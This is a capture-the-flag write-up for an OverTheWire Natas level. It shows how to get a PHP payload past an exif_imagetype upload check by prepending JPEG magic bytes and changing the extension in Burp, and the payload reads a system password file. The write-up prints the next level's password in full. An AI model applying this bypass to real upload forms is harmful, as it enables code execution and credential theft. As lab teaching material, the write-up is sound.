# Level 13

## Software used
- Google Chrome + FoxyProxy
- Burpsuite
- Notepad++

## Hint

```php
<?php

function genRandomString() {
    $length = 10;
    $characters = "0123456789abcdefghijklmnopqrstuvwxyz";
    $string = "";

    for ($p = 0; $p < $length; $p++) {
        $string .= $characters[mt_rand(0, strlen($characters)-1)];
    }

    return $string;
}

function makeRandomPath($dir, $ext) {
    do {
    $path = $dir."/".genRandomString().".".$ext;
    } while(file_exists($path));
    return $path;
}

function makeRandomPathFromFilename($dir, $fn) {
    $ext = pathinfo($fn, PATHINFO_EXTENSION);
    return makeRandomPath($dir, $ext);
}

if(array_key_exists("filename", $_POST)) {
    $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);

    $err=$_FILES['uploadedfile']['error'];
    if($err){
        if($err === 2){
            echo "The uploaded file exceeds MAX_FILE_SIZE";
        } else{
            echo "Something went wrong :/";
        }
    } else if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {
        echo "File is too big";
    } else if (! exif_imagetype($_FILES['uploadedfile']['tmp_name'])) {
        echo "File is not an image";
    } else {
        if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {
            echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded";
        } else{
            echo "There was an error uploading the file, please try again!";
        }
    }
} else {
?>
```

## Solution

Let's start by analyzing the code. At a first glance, the code is very similar to level12 code.  
Use Burpsuite comparer to compare the codeblocks:

<img src="https://github.com/jupitersinsight/writeups/assets/110602224/650e738a-1d8a-43c2-96f1-a9de723aedf9" width=900 height=auto>  

As we can see developers added a few lines of code.  

```php
$err=$_FILES['uploadedfile']['error']
```
The variable _$err_ is assigned the [error code](https://www.php.net/manual/en/features.file-upload.errors.php) associated with the file upload.  
[$\_FILES['userfile']['error']](https://www.php.net/manual/en/features.file-upload.post-method.php): The error code associated with this file upload.  

```php
if($err){
        if($err === 2){
            echo "The uploaded file exceeds MAX_FILE_SIZE";
        } else{
            echo "Something went wrong :/";
        }
```

If the error code variable is not empty the code checks if the error code is equal to [2 (UPLOAD_ERR_FORM_SIZE - The uploaded file exceeds the MAX_FILE_SIZE directive that was specified in the HTML form.)]([UPLOAD_ERR_FORM_SIZE](https://www.php.net/manual/en/features.file-upload.errors.php)).  
If the variable holds any other error code, prints the message "Something went wrong :/".  

Once the filesize has been checked, the application checks the filetype of the uploaded file.  
```php
else if (! exif_imagetype($_FILES['uploadedfile']['tmp_name'])) {
        echo "File is not an image";
```  
[exif_imagetype](https://www.php.net/manual/en/function.exif-imagetype.php): reads the first bytes of an image and checks its signature.  
If the returned value is anything other than an integer (see link above for image code reference) the file is rejected (**!** means _not_).  

In order to bypass this control we need to alter the signature bytes of our php file.  
The first few bytes of a file are used as signature to identify or verify content of a file, these bytes are also called Magica Bytes.  
[Here a list from Wikipedia](https://en.wikipedia.org/wiki/List_of_file_signatures).  

We are going to need the Magic Bytes of jpg/jpeg files: FF D8 FF E0 00 10 4A 46 49 46 00 01

First of all, open up Notepad++ (on Windows) and write a simple php code, like the following:
```php
aaaaaaaaaaaa<?php echo file_get_contents("/etc/natas_webpass/natas14");?>
```
Now, select all text and use Notepad++ built-in plugin and convert to hex, you'll get something like this:
```
6161616161616161616161613C3F7068
70206563686F2066696C655F6765745F
636F6E74656E747328222F6574632F6E
617461735F776562706173732F6E6174
6173313422293B3F3E
```
Remove the first 12 bytes, '61' (hex representation for 'a') and insert the 12 Magic Bytes above:
```
FFD8FFE000104A46494600013C3F7068
70206563686F2066696C655F6765745F
636F6E74656E747328222F6574632F6E
617461735F776562706173732F6E6174
6173313422293B3F3E
```
Select all and convert back to ASCII.  
You'll end up having something like the string in the picture below, save the file a .php.

<img src="https://github.com/jupitersinsight/writeups/assets/110602224/8d5a3e5b-3a9a-4812-819e-efc2ca214a5a" width=400 height=auto>

Now, upload the file while having BurpProxy interception set to on.  
While in transit, change the filename extension from .jpg to .php (as in the previous level) and forward the request. 
Note that the first characters of the uploaded files are "ÿØÿàJFIF" which identifies the file as a jpg/jpeg image.  
<img src="https://github.com/jupitersinsight/writeups/assets/110602224/290c2166-7279-41e2-b019-a7f6889458ef" width=450 height=auto>  

The file is successfully uploaded. Now we only need to request it to have the remote server executing it.  
<img src="https://github.com/jupitersinsight/writeups/assets/110602224/6580de75-d113-4e9e-ba8d-f7fd78634ec9" width=900 height=auto>

<img src="https://github.com/jupitersinsight/writeups/assets/110602224/c8bd4346-604d-4540-b3ae-dbe3ae7af2a7" width=700 height=auto>

The password is: **qPazSJBmrmU7UQJv17MHk1PGC4DxZMEP**


